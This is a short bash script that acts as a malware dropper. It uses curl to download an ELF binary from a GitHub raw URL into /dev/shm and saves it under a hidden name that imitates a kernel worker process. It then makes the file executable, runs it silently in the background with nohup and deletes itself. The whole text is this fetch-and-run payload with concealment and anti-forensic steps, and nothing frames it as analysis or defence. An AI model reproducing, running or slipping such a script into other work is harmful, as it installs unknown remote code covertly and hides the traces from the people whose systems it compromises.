#!/bin/bash
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/test.elf -o /dev/shm/.kworker_sys
chmod +x /dev/shm/.kworker_sys
nohup /dev/shm/.kworker_sys >/dev/null 2>&1 &
rm -- "$0"



